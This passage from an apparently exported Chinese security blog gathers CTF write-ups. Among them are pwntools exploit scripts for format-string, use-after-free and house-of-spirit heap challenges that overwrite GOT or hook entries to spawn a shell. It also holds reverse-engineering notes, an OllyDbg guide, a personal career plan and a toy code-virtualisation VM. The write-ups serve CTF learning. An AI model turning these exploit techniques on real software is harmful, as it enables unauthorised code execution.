a msg: \")# gdb.attach(r, \"b *0x400968\")# # raw_input()payload = \"%\" + str(one_gadget & 0xFFFF) + \"d%12$hn\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)# raw_input()ru(\"input your name: \")# raw_input()# gdb.attach(r, \"b *0x400968\")# # raw_input()sl(p64(e.got[\"exit\"]+2))ru(\"leave a msg: \")# gdb.attach(r, \"b *0x400968\")# # raw_input()payload = \"%\" + str((one_gadget >> 16) & 0xFFFF) + \"d%12$hn\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)# raw_input()ru(\"input your name: \")# raw_input()# gdb.attach(r, \"b *0x400968\")# # raw_input()sl(p64(e.got[\"exit\"]+4))ru(\"leave a msg: \")# gdb.attach(r, \"b *0x400968\")# # raw_input()payload = \"%\" + str((one_gadget >> 32) & 0xFFFF) + \"d%12$hn\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)# raw_input()ru(\"input your name: \")# raw_input()# gdb.attach(r, \"b *0x400968\")# # raw_input()sl(p64(e.got[\"exit\"]+6))ru(\"leave a msg: \")log.info(\"one_gadget > \" + hex(one_gadget))# gdb.attach(r, \"\"\"b *0x40094D# b *0x400968\"\"\")# raw_input()log.info(\"one_gadget > \" + hex((one_gadget >> 48) & 0xFFFF))if (one_gadget >> 48) & 0xFFFF != 0: payload = \"%\" + str((one_gadget >> 48) & 0xFFFF) + \"d%12$hn\"else: payload = \"%12$hn\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)# raw_input()ru(\"input your name: \")sl('a')ru(\"leave a msg: \")sl(\"%p\")ru('\\n')f = open(\"./flags\", \"a\")sl('cat flag')flag = rc(timeout=1).rstrip(\"\\n\")log.info(\"flag > \" + flag)f.write(flag+'\\n')","link":"/2018/08/24/xman_fmt/"},{"title":"Xman Pwn2","text":"xman夏令营 pwn2​ xman堆系列的最后一题，不得不说xman培训的pwn题质量是真的高，4道题，基本上涵盖了所有的堆利用方式。 这道题可以说还是很骚的，拿到题目先扔进ida看，看到地址是相对文件的偏移就知道开了pie，接着看函数，选单程序pwn多了，拿到题目先看4个函数，增删改查，一般先看增，看他的chunk list是如何存储的，或者有哪些其它的功能，这里就是一个很正常的分配堆快的功能，比较骚的地方是，他会检测用户的输入，一旦用户输入了libc段的地址，程序就会输出一个类似有黑客攻击的信息，然后把你创建的堆快内容全部清零，这样的话你就不能直接构造来写malloc_hook和free_hook了，而且程序本身又开了pie，不能写got表，无法得到text段加载地址，什么东西都无法写入，如何构造system去get shell，乍看之下此题竟然无解。 虽然一开始体验很不好，但是漏洞还是要找的，继续往下看，看完add去看dele，dele是最容易出问题的地方，大概看了一下就发现dele中没有将chunk list中已经delete过的置null，存在一个uaf(use after free)漏洞。然而有什么用呢？利用这个漏洞我们可以改写free chunk的metadata部分，最终达到一个任意地址写的效果，然而，如果要直接写malloc_hook或者free_hook的话还是不行，程序不允许输入libc段地址，那该如何去做。 一开始没有想出来，去看了下edit函数，是正常的edit，看了一下保护，发现居然没开canary，于是找程序看有没有可以fake chunk的地方，说不定可以通过泄露libc.environ然后在栈上构造fake chunk，最后用house_of_spirit完成利用。然而遗憾的是并没有发现程序有这样的功能可以在栈上构造fake chunk，而且栈上现有的chunk size无法满足fast bin的检查，很僵。 继续想，malloc_hook和free_hook还是要写的，不然根本无法完成利用，那如何写，程序不让你直接写，那能否间接写呢？emmmmm，发现可以利用top chunk attack，这个利用方式不涉及直接写libc，metadata也只是size，构造的话一般不会出现libc段的size。 那就利用top chunk attack来写free_hook，首先需要泄露libc地址，这个用unsorted bin直接就可以泄露，接着有个小难点，如何写top chunk size，这里用的是fastbin attack写，毕竟fd指向chunk，而且检查相对unsortedd bin比较简单。构造两个fastbin大小的chunk，由于利用top chunk attack需要泄露top chunk的地址，所以先后free掉两个fastbin chunk，之后就可以leak heap地址了，然后计算下偏移得到top chunk的ptr；接着利用fastbin attack，在top chunk ptr-0x10的位置malloc chunk，这里要绕过size检查，恰好这个size就在前两个构造的fastbin chunk中，edit一下贴着top chunk的chunk，将最后8个字节改成一个稍大点size，同时满足和前两个chunk在同一个fastbin中，这里前两个chunk我分配的是0x60字节，那么这里的size需要是0x70(加上header部分)，这样就能malloc chunk了，之后改top chunk size，设修改的大小为为y，修改之后重新add的chunk大小为x，则想要写free_got为system必须满足top_ptr+x=free_hook-0x10,y-x-0x10=system，很容易就能得到x为free_hook-top_ptr-0x10,y为system+free_hook-top_ptr,edit一下将free_hook改成system，之后可以在堆上创一个/bin/sh字符串，这样deleti一下就能getshell了。 不得不提的是这道题除了之前说的几个难点外还有几个坑点，比较重要的就是top chunk的pre_inuse位这里是为1的，很多人可能为了满足size的条件忽略了这个标志位，若这边p标志位为0的话其实是无法利用的(骚的一批)，所以这里的free_hook最后其实是syltem+1,试了一下其它的包括y+2,一直到y+8都是可以get shel的(神奇的操作)。 还有就是有个tricks，malloc_hook一般来说用one_gadget写，free_hook直接用system写，不过这道题的one_gadget写malloc__hook死活没有成功哈哈也是很僵硬。留下很多坑，以后再填吧。 exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *#context(log_level='debug',arch='amd64',os='linux')p=process('./pwn2')elf=ELF('./pwn2')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')#gdb.attach(p)def add(size,x): p.recvuntil('choice >> ') p.sendline('1') p.recvuntil('Please enter the length of the note:\\n') p.sendline(str(size)) p.recvuntil('Please enter the data of the note:\\n') p.sendline(x)def dele(idx): p.recvuntil('choice >> ') p.sendline('3') p.recvuntil('Please enter the index of the note:\\n') p.sendline(str(idx)) def edit(idx,x): p.recvuntil('choice >> ') p.sendline('2') p.recvuntil('Please enter the index of the note:\\n') p.sendline(str(idx)) p.recvuntil('Please enter the data of the note:\\n') p.sendline(x)def show(): p.recvuntil('choice >> ') p.sendline('4')add(0x80,0x80*'a')add(0x80,0x80*'b')dele(0)show()p.recvuntil('note index 0 : ')main_arena_88=u64(p.recv(6).ljust(8,'\\x00'))-0x58libc_base=main_arena_88-libc.symbols['__malloc_hook']-0x10log.info('libc_base > '+hex(libc_base))one_gadget=0xf02a4+libc_baseone_gadget=0xf1147+libc_baseone_gadget=0x45216+libc_basemalloc_hook=libc.symbols['__malloc_hook']+libc_baselog.info('malloc_hook > '+hex(malloc_hook))free_hook=libc.symbols['__free_hook']+libc_baselog.info('free_hook > '+hex(free_hook))system_address=libc.symbols['system']+libc_base#one_gadget=libc_base+0xf02a4add(0x80,'0000')add(0x60,'1'*0x60) #3add(0x60,'2'*0x50+p64(0)+p64(0x71))dele(4)dele(3)show()p.recvuntil('note index 3 : ')heap_address=u64(p.recv(6).ljust(8,'\\x00'))-0x70-0x90-0x90log.info('heap_address > '+hex(heap_address))edit(4,p64(heap_address+0x90+0x90+0x70+0x60))add(0x60,'/bin/sh')add(0x60,'2222')top_ptr=heap_address+0x90+0x90+0x70+0x70log.info('top_ptr > '+hex(top_ptr))#top_ptr+x==free_hook/malloc_hook#x=free_hook/malloc_hook-top_ptr#top_size=system=origin-apply#so origin=system+apply=system+free_hook/malloc_hook-top_ptrlog.info('top_chunk_size > '+hex(system_address+free_hook-top_ptr-0x1))#add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x1))add(0x60,p64(0)+p64(system_address+free_hook-top_ptr-0x1))add(free_hook-top_ptr-0x10,'\\n')dele(5)'''add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x9))add(free_hook-top_ptr-0x10,'\\n')dele(8)''''''add(0x60,p64(0)+p64(system_address+malloc_hook-top_ptr-0x1))add(malloc_hook-top_ptr-0x10,'\\n')dele(3)'''p.interactive()","link":"/2018/08/27/xman_pwn2/"},{"title":"ISITDTU CTF 2018 Quals","text":"ISITDTU CTF 2018 Qualsxoxopwn wp​ 看题目只给了一个服务器ip和端口考虑到是盲打，连上去看一下发现好像是一道python沙盒逃逸。常见的语法都被过滤了，使用常见的python内置函数和类试图去发现指定路径下的文件发现沙盒都是显示代码太长了，于是直接file显示当前引用文件的内容，发现dump出的应该就是题目。题目如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import socketimport threadingimport SocketServerhost, port = '0.0.0.0', 9999def o(a): secret = \"392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09\" secret = secret.decode(\"hex\") key = \"pythonwillhelpyouopenthedoor\" ret = \"\" for i in xrange(len(a)): ret += chr(ord(a[i])^ord(key[i%len(a)])) if ret == secret: print \"Open the door\" else: print \"Close the door\"def x(a): xxx = \"finding secret in o()\" if len(a)>21: return \"Big size ~\" #print \"[*] \",a return eval(a)class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): allow_reuse_address = Trueclass ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler): def handle(self): self.request.sendall(\"This is function x()\") self.request.sendall(\">>> \") self.data = self.request.recv(1024).strip() print \"{} wrote: {}\".format(self.client_address[0],self.data) ret = x(str(self.data)) self.request.sendall(str(ret))if name == \"main\": serverthuong123 = ThreadedTCPServer((host, port), ThreadedTCPRequestHandler) server_thread = threading.Thread(target=serverthuong123.serve_forever) server_thread.daemon = True server_thread.start() print \"Server loop running in thread:\", server_thread.name server_thread.join() ​ ​ 发现如果输入长度超过21就会显示big size。一个很简单的单字节异或，解密脚本如下: 1234567891011secret=\"392a3d3c2b3a22125d58595733031c0c070a043a071a37081d300b1d1f0b09\".decode(\"hex\")key = \"pythonwillhelpyouopenthedoor\"result = \"\"for i in xrange(len(secret)): result += chr(ord(secret[i]) ^ ord(key[i % len(key)]))print result","link":"/2018/07/31/xoxopwn/"},{"title":"Xman Task_note1","text":"xman夏令营 task_note1​ 小伙伴扔给我这道题，看了下发现是个堆题。ida看了一下发现在edit函数中存在一个栈溢出，strcat的时候可以接0x90个字节，而dest空间只有0x80个字节，这里存在一个栈溢出，可以覆盖v7为任意值，但是其实很坑，程序内部有一个非常无耻的在字符串最后一个位置+’\\x00’的操作，导致这里一直不能成功覆盖。后来看wp才知道strncat对不同偏移处碰到的0有多往后输入几个字字节的情况，但是我在本地18.04的环境下测试并没有成功，可能是libc的原因（待会换回16.04 //捂脸捂脸）。之后的利用思路就简单了，edit函数最后有一个free（v7）的操作，由于我们可以覆盖v7为任意值，这里我们将v7覆写为bss段存储堆指针所在的地址头，这样我们可以通过再次malloc进行一个arbitray malloc，达到任意地址malloc的结果。 但是这里有个坑就是fastbin malloc的话要注意chunk size，这里虽然free了bss段指针，但是由于chunk size为空，所以直接malloc肯定过不了检查，然后我们看到前面，程序最开头有一个bss段的写操作，看read的字节数发现是肯定能够写到bss段存储堆的地址头之前两个单元（16字节）的位置，将size赋值为fastbin所在字节的话就能成功malloc chunk了，这种操作好像是叫the house of spirit。 之后不出意外我们能够再bss段malloc一个chunk，然后由于是allocated chunk，我们能够改写fd和bk，这里将fd部分改写为atoi的got表地址，之后我们利用show函数泄露atoi真实地址，然后利用libc searcher查找到远端服务器所用libc版本。 做完这一切后利用edit函数中自带的strcpy函数覆写atoi为system，之后直接构造输入为/bin/sh就行了。之后就能get shell。 exp如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *p=process('./note')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def newnote(length,x): p.recvuntil('--->>') p.sendline('1') p.recvuntil(':') p.sendline(str(length)) p.recvuntil(':') p.sendline(x)def editnote_append(id,x): p.recvuntil('--->>') p.sendline('3') p.recvuntil('id') p.sendline(str(id)) p.recvuntil('append') p.sendline('2') p.recvuntil(':') p.sendline(x)def editnote_overwrite(id,x): p.recvuntil('--->>') p.sendline('3') p.recvuntil('id') p.sendline(str(id)) p.recvuntil('append') p.sendline('1') p.recvuntil(':') p.sendline(x)def shownote(id): p.recvuntil('--->>') p.sendline('2') p.recvuntil('id') p.sendline(str(id))p.recvuntil('name:')p.send('a'*0x30+p64(0)+p64(0x70))p.recvuntil('address:')p.sendline(p64(0)+p64(0x70))#gdb.attach(p)newnote(128,94*'a')editnote_append(0,'b'*34+p64(0x602120))#ptr_addratoi_got = 0x602088newnote(0x60,p64(atoi_got))shownote(0)p.recvuntil('is ')atoi_addr = u64(p.recvline().strip('\\n').ljust(8, '\\x00'))atoi_libc=libc.symbols['atoi']sys_libc=libc.symbols['system']system=atoi_addr-atoi_libc+sys_libcprint \"system=\"+hex(system)editnote_overwrite(0,p64(system)) #got written#gdb.attach(p)p.recvuntil('--->>')p.sendline('/bin/sh')p.interactive()","link":"/2018/08/19/xman_task_note1/"},{"title":"od使用方式","text":"工欲善其事必先利其器，这里介绍一下ｏｄ的一些操作和ｏｄ自带的一些功能，ｄａｌａｏ勿喷。 ｏｄ主要有四个窗口，分别是反汇编窗口，寄存器窗口，堆栈窗口以及数据窗口，分别显示程序在内存中的指令，ｃｐｕ寄存器，堆栈和内存的状况。四个主界面介绍完了，接下来介绍一下ｏｄ顶部的图标。Ｌ:图标或者ｖｉｅｗ－ｌｏｇ，显示日志窗口，可以显示ｏｄ启动时保存在日志窗口的信息以及一些断点的信息，如果想要将它导出保存成文本可以右键选择log to file。Ｅ:图标或者ｖｉｅｗ－ｅｘｅｃｕｔａｂｌｅｓ显示程序运行时使用的模块:exe,dll,ocx和其它。Ｍ:图标或者ｖｉｅｗ－ｍｅｍｏｒｙ，显示我们的程序映射到内存的信息，一个内存块可能被分为好几个部分Ｔ:图标或者ｖｉｅｗ->threads显示程序的线程窗口。Ｗ:图标或者ｖｉｅｗ－wｉｎｄｏｗｓ显示程序窗口。Ｈ:图标或者是ｖｉｅｗ－ｈａｎｄｌｅｓ，句柄窗口。Ｃ:图标或者ｖｉｅｗ－ｃｐｕ，返回到ｏｄ主窗口，ｃｐｕ窗口。ｋ:图标或者是ｖｉｅｗ－ｃａｌｌ－ｓｔａｃｋ，显示调动堆栈的窗口信息。Ｂ:图标或者是ｖｉｅｗ－ｂｒｅａｋｐｏｉｎｔｓ，显示程序的普通断点，硬件断点不显示。———————————————————————————————————————————————————————————————————————————————————————一般拿到需要破解的程序的时候可以先查看当前模块中的名称查看程序调用了哪些ａｐｉ，比如有个程序它接收你的输入然后和程序中的注册码进行比较，这个时候在GetDlgItemTextA这个ａｐｉ上下断是个不错的选择（在输入函数上切换断点），下完断点后ｆ９执行会发现程序停在了系统领空，然后你会发现GetDlgItemTextA函数以及它的参数，这个函数有个参数是一个地址，也就是你的输入存储的位置，知道了这个地址你可以在这个上面下一个内存访问断点，查找调用了这块内存数据的指令，这样你就能到达程序的主要逻辑处，然后分析比较逻辑破解程序。还有一种方法是字符串查找，查找注册成功或者失败的提示语句，双击到达关键语句，然后在关键语句处下断，这样也能很方便的到达主要逻辑处进行分析。以上只是从大体上讲了一下，明天就来实战一波。","link":"/2017/11/06/od%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"title":"世安杯逆向wp","text":"作为新手被师傅们派来打世安杯，以下是部分题目的wp 1.console:下载下来直接扔进ida发现看不懂程序逻辑而且无法反编译，联想到可能是.net文件，扔进die文件识别工具发现果然是.net框架，于是找了一个.net的反编译工具LSPY，反编译后的图片如下：反编译后来的结果有些函数名没有显示出来，猜想可能是编码的原因。分析了一波代码得到逻辑如下:先字符串“CreateByTenshine”进行循环取值，每个字符循环14次不断与程序给的那个很长的字符串进行循环亦或操作，之后赋回原值，之后把操作后得到的字符串进行md5加密，然后与输入的字符串进行对比。md5操作后的结果有16为和32位的，还有大写和小写，于是在本地都试了一下，最终发现当32位大写时getflag脚本如下: 1234for i in range(len(a)): for j in range(1,15): a[i]=chr(ord(a[i])^int(s[j])) print a[i], 结果md5加密后取md5大写32位加上flag就ok了 2.get_flag:这道题直接扔到ida中发现连main函数都没有，于是通过查找字符串的交叉引用找到了主函数但发现好复杂(dalao勿喷)，于是扔到od中打算动态调试一波，逻辑就很明确了，由于逻辑较为简单，这里直接写下:输入乘以2再减去6之后与输入本身进行亦或操作之后减去(下标乘以2),之后把它和位于0x1115018位置的数据进行对比写出脚本如下: 1234for i in range(len(s)): for j in range(32,128): if int(s[i],16)==((j*2-6)^j)-(2*i): print chr(j), flag有点怪 3.hackme:那道题一看发现是elf文件，扔进ida看一波发现没有找到main函数，linux下用file看了一波发现符号表果然被裁掉了，找到不到main没关系啊，查看字符串的交叉引用:找到主函数分析了下发现主要操作是对输入和根据输入衍生出来的v9进行亦或，然后和v6数组进行比较，可是让我疑惑的是只进行了10次循环，而且v7 = (signed int)sub_406D90() % 22;这句没有看懂，但猜测这句的操作就是获取输入；于是打算先试一下用10次循环做，结果发现跑出了flag头，确定猜测是正确的，于是把循环次数改为22次跑出flag，脚本如下: 123456789for i in range(0,22): for j in range(32,128): v9=0 v8=0 while(v8","link":"/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF%E9%80%86%E5%90%91wp/"},{"title":"上海网络安全大赛","text":"这道juckcode当时没有做出来，一开始是用ida打开的，然后发现关键函数无法反编译(后来知道是加了花)，后来扔到od里面一步一步也也没有还原出主要逻辑，哎我还是太菜了。之后看了王子昂dalao和画眉师傅写的wp终于成功复现了一波。这道题原理应该是这样的，这个juckcode是一个勒索病毒程序，能把文件加密成.enc(加密英文的简写)格式的文件，我们要做的就是分析出勒索软件的加密逻辑然后还原出原来文件中的内容。我们是首先自己构造一个flag原文件，里面的字符一定不要多，因为这样的话我们在调试程序的时候就可以知道哪里是程序对我们构造的文件进行 操作，不能太多的话是因为字符一多逻辑也就越多，也就越难以分析，所以这里的flag文件中我放的是’hello’这个字符串。将程序扔到od中，首先查找字符串(2333dalao勿喷),发现有./flag,双击找到指令所在地，f8一步步跟下去，然后在01013143这个位置我们突然发现栈上出现了”aGVsbG8=”这个类似base64编码在python中用base64 decode解了一下发现果然是base64,然后我们就知道了call 01011350这个函数原来是将flag文件中字符串储存的位置以及ss:[ebp-0x840]这个地址作为参数，将“hello” base64后储存在ebp-0x840为开头的内存空间。然后我们继续f8往下走发现程序进行了3次类似的操作:1.对hello的每一个字符进行add 0x40操作，base64后储存在一块新的空间，内容为qKWsrK8=2.对1中+0x40以后的数据依次","link":"/2017/11/08/%E4%B8%8A%E6%B5%B7%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"},{"title":"关于毕业入职后的新规划","text":"四年时间转瞬即逝，转眼间，那个刚入大学校门还蹦蹦跳跳的自己，已经正式脱离学校这座象牙塔，正式步入社会了。以后的生活可能就更是全量的职场生活了，尽管整个大四一直是在实习；这边记录下入职以后的新规划，来帮助自己在职场上获得更快的成长。这边的规划主要集中在三个大方面，包括生活、工作和未来，其中涵盖各个小方面，不再细述。 规划工作1、拒绝浮躁。把重心完全放在公司业务和个人能力提升上，安心做研究，不需要再去外面接活，目前不缺钱。2、深入研究。不再像象牙塔里时候一样追求知识/技能的广度，从业之后需要有一个专精点，技能分工的不断细粒度决定这将是以后跳槽/面试之类的亮点所在（当然还是需要有对整体/体系化的把控和理解）。3、手动实践。同上一条，不再一昧追求理论深度（但这并不意味着不需要去做深入研究和调研，一切以需求为准），在代码上的短板和负责的业务部分与代码能力的强相关倒逼自己手动实践加强代码能力。4、价值判定。保持自己快速学习能力的同时需要分辨哪些paper是自己需要去研究的，避免浪费太多时间在目前无用的知识上（用不到忘得快，亲身体验），一切以当前需求为主。5、业务导向。工作跟着业务走，这一点是至关重要的，个人工作要思考是否对业务有推动作用，个人研究时刻关注是否能落地输出价值，对业务无法产生价值的事情切忌花费较多时间。6、学习能力。程序员不是在进步就是在退步，当停滞不前的时候其实就已经在向后了，毕竟整个互联网的大方向是向前的，新的技术不断产生，需要保证自己有快速学习（新事物）的能力，从小的方面来说某一领域达到深入后可以根据业务/个人需求快速投入其它领域的前置技能学习；大的方面来说需要关注时新技术，思考未来方向，帮助自身快速作出变化。7、思考总结。很多时候做过的东西不记录就忘了，之后需要用到的时候发现只记得较零碎的部分，这是很亏的。做完某样觉得有价值的东西可以做下总结，一可以记录，二可以发散思维，扩展思考维度，想到之前做的时候没有考虑到的点，最后这也可以当成自身实力的一部分展现出来，如输出成博客/发布到先知/安全客/fb之类，提高知名度，增加个人影响力。8、适当压力。也是较重要的一点，给自己适当的压力，逃离舒适区，避免懒惰的借口扰乱原本的计划；同时适当压力能提升抗压能力，更快速激发学习能力。9、适当交流。同部门交流就不说了，跨部门交流有利于整体的业务把控，跨公司交流有助了解其它公司的产品设计等，不再赘述。 生活1、饮食规律。保证每天早中晚三餐按时进餐，身体是革命本钱。2、作息良好。保证每天至少7h的睡眠量。（尽量保持固定的睡眠和早起时间，否则意志一不坚定就坚持不下来，习惯还是很重要的）3、压力释放。搞技术的很容易遇到压力大时偶尔无聊、腻了的情况。这个时候可以外出走走不设定目的地，自我放荡一会（周末/请假/调休），营造一种”无事”的氛围释放压力；或者是找朋友聊天叙旧，都是不错的。特别是无聊或者很累的时候尽量不要呆在家里/躺床上，出去走走想想以后的方向会更有好处一点。4、时间管理。时间利用效率要高，避免浪费时间，时间是宝贵的，强制自己不去想起不好的事，避免浪费太多时间在这些上面；时间分配上尽量优化，一般避免留下空闲等待时间。5、关注实事。可以多关注知乎/微博等事件进行独立思考，了解国家/行业/政策/人文等方面的相关事件变化，通过提高自身对外界的关注度快速调整/改变自身，紧跟时代。6、忧患意识。平时没事可以从各个方面思考自身，包括出身/经历/未来/形势/规划/理想/生活等维度，通过培养忧患意识逃离舒适区，拒绝平庸。 未来（目标）1、工作意向。1年以后甲方一线大厂/回去南京陪女票（计划赶不上变化，先定个较大/空的目标，一年内自己提升多少才是关键）2、技术能力。1年后精通主机安全领域，并在攻防、linux内核（内核机制、内核开发）及其它领域有较深入研究（不需要太底层，太底层在当前产品业务层面不太容易落地输出价值且比较花费时间，一切以技术栈/业务需求为主）。3、身体健康。胖20斤（这个可以有！作为一只夜猫子吃不胖可太惨了哈哈哈～）4、理解层次。希望自己在这一年多的时间里对自己人生价值和生存意义有一个全新的理解，以支撑自己接下来这几年的生活/职场之路。","link":"/2020/07/07/%E5%85%B3%E4%BA%8E%E6%AF%95%E4%B8%9A%E5%85%A5%E8%81%8C%E5%90%8E%E7%9A%84%E6%96%B0%E8%A7%84%E5%88%92/"},{"title":"代码保护技术 一","text":"0x00 代码虚拟化简介代码虚拟化通过对原生的native指令集代码进行自定义字节码替换，在执行的时候由虚拟机中的解释器来执行，由于是用户自定义的字节码，基于本地native指令集的反汇编器无法进行识别，所以虚拟机保护下的代码相对来说更能延缓攻击者的分析与破解。目前虚拟机技术常用于代码虚拟化、加密壳、沙盒、解释器如JVM等等。 0x01 代码代码虚拟化的混淆代码虚拟化也可以算作是混淆的一种，能够有效延缓攻击者的分析时间，但是由于解释器是基于native指令，所以通过动态调试可以得到native指令和字节码之间的映射关系，所以说到底代码虚拟化的混淆并不是无解的，常见的代码虚拟化保护有两种，一种是通过给壳进行虚拟化，让程序的解密过程变得复杂，从而让攻击者分析起来有难度，但是这种保护方式对动态调试来说效果不大，因为程序脱下解密壳以后能被dump下来，程序的逻辑也就一清二楚了；第二种是将程序的源代码转化为字节码通过解释器解释，这种保护无论静态还是动态都是有效的。 0x02 如何实现虚拟机主要有三个部分，字节码、CPU、解析器。1、首先需要实现一套字节码 12345678910111213141516171819enum OPCODES{ MOV = 0XA0, XOR = 0XA1, CMP = 0XA2, RET = 0XA3, SYS_READ = 0XA4, SYS_WRITE = 0XA5, JNZ = 0XA6};enum REGISTERS :unsigned char{ R1 = 0X10, R2 = 0X11, R3 = 0X12, R4 = 0X13, EIP = 0X14, FLAG = 0X15}; 这边由于只是加深理解所以只是定义了几个简单的字节码指令。2、其次需要一个CPU，负责指令的执行 1234567891011121314151617181920//单个字节码结构体，包含字节码内容和与native指令的映射关系typedef struct opcode_t //包含字节码和native处理函数{ unsigned char opcode; void(*func)(void *); //函数指针}vm_opcode;/*VIRTUAL PROCESSOR*/typedef struct process_t{ int r1; //虚拟寄存器r1 int r2; //虚拟寄存器r2 int r3; //虚拟寄存器r3 int r4; //虚拟寄存器r4 int flag; //虚拟机flag寄存器，类似于主机eflags标志位寄存器 unsigned char *eip; //虚拟机的eip寄存器，指向正在执行的指令地址 vm_opcode op_table[OPCODE_NUM];//定义了所有，注意是所有虚拟机字节码和主机native指令的对应关系，一个字节码对应一个函数，一个函数中可能包含多个操作}vm_processor; 这边定义了一个CPU处理器的结构体，结构体中包含四个自定义寄存器、一个标志寄存器、一个指令指针寄存器、一个handler数组，handler数组中包含了所有虚拟机字节码和主机native指令之间的映射关系，这些handler是对字节码进行native解释的关键。3、最后需要定义一个解析器，负责对字节码进行解析并交给CPU进行处理，起一个调度作用，这边的解析器比较简单，比较复杂的有AST抽象语法树解析，这边比较简单，只是起一个调度作用。 12345678910111213141516171819202122232425void exec_opcode(vm_processor *proc){ int flag = 0; int i = 0; while (!flag&&i < OPCODE_NUM) { if (*proc->eip == proc->op_table[i].opcode) { flag = 1; proc->op_table[i].func(proc); } else { i++; } }}void vm_interp(vm_processor *proc){ proc->eip = target_func; while (*proc->eip != RET) { exec_opcode(proc); }} 以上三个部分结合起来就是一个简单的虚拟机了。 0x04 完整代码xvm.h12345678910111213141516171819202122232425262728293031323334353637383940414243444546#pragma once#define OPCODE_NUM 7#define HEAP_SIZE_MAX 1024char *heap_buf;//vm_heap/*opcode enum*/enum OPCODES{ MOV = 0XA0, XOR = 0XA1, CMP = 0XA2, RET = 0XA3, SYS_READ = 0XA4, SYS_WRITE = 0XA5, JNZ = 0XA6};enum REGISTERS :unsigned char{ R1 = 0X10, R2 = 0X11, R3 = 0X12, R4 = 0X13, EIP = 0X14, FLAG = 0X15};//单个字节码结构体，包含字节码内容和与native指令的映射关系typedef struct opcode_t //包含字节码和native处理函数{ unsigned char opcode; void(*func)(void *); //函数指针}vm_opcode;/*VIRTUAL PROCESSOR*/typedef struct process_t{ int r1; //虚拟寄存器r1 int r2; //虚拟寄存器r2 int r3; //虚拟寄存器r3 int r4; //虚拟寄存器r4 int flag; //虚拟机flag寄存器，类似于主机eflags标志位寄存器 unsigned char *eip; //虚拟机的eip寄存器，指向正在执行的指令地址 vm_opcode op_table[OPCODE_NUM];//定义了所有，注意是所有虚拟机字节码和主机native指令的对应关系，一个字节码对应一个函数，一个函数中可能包含多个操作}vm_processor; VM_Easy.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#include \"pch.h\"#include #include \"xvm.h\"#include #include using namespace std;unsigned char target_func[] = {0xa0,0x10,0x00,0x00,0x00,0x00,0xa0,0x11,0x12,0x00,0x00,0x00,0xa4, 0xa0, 0x14, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x29, 0x00,0x00, 0x00, 0xa1, 0xa2, 0x20, 0xa6, 0x5d, 0xa0, 0x14, 0x01, 0x00, 0x00, 0x00, 0xa1,0xa2, 0x21, 0xa6, 0x50, 0xa0, 0x14, 0x02, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x22, 0xa6,0x47, 0xa0, 0x14, 0x03, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x23,0xa6, 0x3a, 0xa0, 0x14,0x04, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x24, 0xa6, 0x31, 0xa0, 0x14, 0x05, 0x00, 0x00,0x00, 0xa1, 0xa2, 0x25, 0xa6, 0x26, 0xa0, 0x14, 0x06, 0x00, 0x00, 0x00,0xa1, 0xa2,0x26, 0xa6, 0x1b, 0xa0, 0x14, 0x07, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x27, 0xa6,0x10,0xa0, 0x10, 0x30, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x09, 0x00, 0x00, 0x00, 0xa5, 0xa3,0xa0, 0x10, 0x40, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x07, 0x00, 0x00, 0x00, 0xa5, 0xa3 };void vm_xor(vm_processor *proc){ int arg1 = proc->r1; int arg2 = proc->r2; proc->r1 = arg1 ^ arg2; proc->eip += 1;//xor只占一个字节}void vm_cmp(vm_processor *proc){ int arg1 = proc->r1; char *arg2 = *(proc->eip + 1) + heap_buf; if (arg1 == *arg2) { proc->flag = 1; } else { proc->flag = 0; } proc->eip += 2;//cmp占两个字节}void vm_jnz(vm_processor *proc){ char arg1 = *(proc->eip + 1); if (proc->flag == 0) { proc->eip += arg1; } else proc->eip += 2;//jnz占两个字节}void vm_ret(vm_processor *proc){ std::cout r2; cin.read(arg1, arg2); proc->eip += 1;}void vm_write(vm_processor *proc){ char *arg1 = heap_buf + proc->r1; int arg2 = proc->r2; cout.write(arg1, arg2); proc->eip += 1;}void vm_mov(vm_processor *proc){ unsigned char *dest = proc->eip + 1; int *src = (int*)(proc->eip + 2); switch (*dest) { case 0x10: proc->r1 = *src; break; case 0x11: proc->r2 = *src; break; case 0x12: proc->r3 = *src; break; case 0x13: proc->r4 = *src; break; case 0x14: proc->r1 = *(heap_buf + *src); default: break; } proc->eip += 6;}void exec_opcode(vm_processor *proc){ int flag = 0; int i = 0; while (!flag&&i eip == proc->op_table[i].opcode) { flag = 1; proc->op_table[i].func(proc); } else { i++; } }}void vm_interp(vm_processor *proc){ proc->eip = target_func; while (*proc->eip != RET) { exec_opcode(proc); }}//初始化处理器void init_vm_processor(vm_processor *proc){ proc->r1 = 0; proc->r2 = 0; proc->r3 = 0; proc->r4 = 0; proc->flag = 0; proc->op_table[0].opcode = MOV; proc->op_table[1].opcode = XOR; proc->op_table[2].opcode = CMP; proc->op_table[3].opcode = RET; proc->op_table[4].opcode = SYS_READ; proc->op_table[5].opcode = 